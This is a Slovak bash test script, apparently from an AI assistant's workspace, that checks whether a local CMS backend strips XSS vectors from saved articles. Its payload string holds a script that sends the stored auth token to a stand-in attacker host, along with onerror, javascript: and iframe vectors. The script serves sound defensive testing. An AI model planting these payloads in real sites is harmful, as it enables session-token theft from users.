#!/bin/bash
# Umiestnenie: /home/claude/test-krok4.sh
# Overenie Kroku 4: XSS sanitizácia na backende

API="http://localhost:3000"
PASS=0; FAIL=0

check() {
  if [ "$3" = "ano" ]; then
    echo "  ❌ $1 — v uloženom obsahu NÁJDENÉ: $2"; FAIL=$((FAIL+1))
  else
    echo "  ✅ $1 — odstránené"; PASS=$((PASS+1))
  fi
}

# Prihlásenie admina
TOKEN=$(curl -s -m 5 -X POST $API/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"test-admin@clubw.sk","heslo":"TestHeslo123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])" 2>/dev/null)

if [ -z "$TOKEN" ]; then echo "❌ Prihlásenie zlyhalo"; exit 1; fi
echo "✅ Admin prihlásený"
echo ""

# Vytvorenie kategórie (článok ju vyžaduje)
KAT=$(curl -s -m 5 -X POST $API/api/admin/categories -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"nazov":"XSS Test Rubrika","popis":"test"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null)
echo "Kategória ID: ${KAT:-nepodarilo sa}"

# Škodlivý obsah - typické XSS vektory
SKODLIVY='<p>Legitímny text článku.</p><script>fetch("https://zlyweb.sk?t="+localStorage.getItem("clubw_token"))</script><img src=x onerror="alert(document.cookie)"><a href="javascript:alert(1)">klikni</a><iframe src="https://zlyweb.sk"></iframe>'

echo ""
echo "═══ Ukladám článok so škodlivým HTML ═══"
ODP=$(curl -s -m 10 -X POST $API/api/admin/articles -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"nazov\":\"XSS Test Clanok\",\"obsah\":\"$(echo $SKODLIVY | sed 's/"/\\"/g')\",\"kategoria_id\":${KAT:-1},\"status\":\"published\"}")

SLUG=$(echo "$ODP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('slug',''))" 2>/dev/null)

if [ -z "$SLUG" ]; then
  echo "  ⚠️  Článok sa nevytvoril, odpoveď:"
  echo "$ODP" | head -c 400
  exit 1
fi
echo "  Článok vytvorený, slug: $SLUG"

# Načítanie uloženého obsahu z DB
ULOZENY=$(curl -s -m 5 "$API/api/articles/$SLUG" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['obsah'])" 2>/dev/null)

echo ""
echo "═══ Uložený obsah v databáze ═══"
echo "  $ULOZENY"
echo ""
echo "═══ Kontrola odstránenia XSS vektorov ═══"

echo "$ULOZENY" | grep -q "<script" && S=ano || S=nie
check "<script> tag" "<script>" "$S"

echo "$ULOZENY" | grep -q "onerror" && S=ano || S=nie
check "onerror= handler" "onerror" "$S"

echo "$ULOZENY" | grep -q "javascript:" && S=ano || S=nie
check "javascript: odkaz" "javascript:" "$S"

echo "$ULOZENY" | grep -q "<iframe" && S=ano || S=nie
check "<iframe> tag" "<iframe>" "$S"

echo "$ULOZENY" | grep -q "Legitímny text" && L=ano || L=nie
if [ "$L" = "ano" ]; then
  echo "  ✅ Legitímny obsah zachovaný"; PASS=$((PASS+1))
else
  echo "  ❌ Legitímny obsah sa stratil!"; FAIL=$((FAIL+1))
fi

echo ""
echo "═══════════════════════════════════════"
echo "  VÝSLEDOK: $PASS prešlo, $FAIL zlyhalo"
echo "═══════════════════════════════════════"
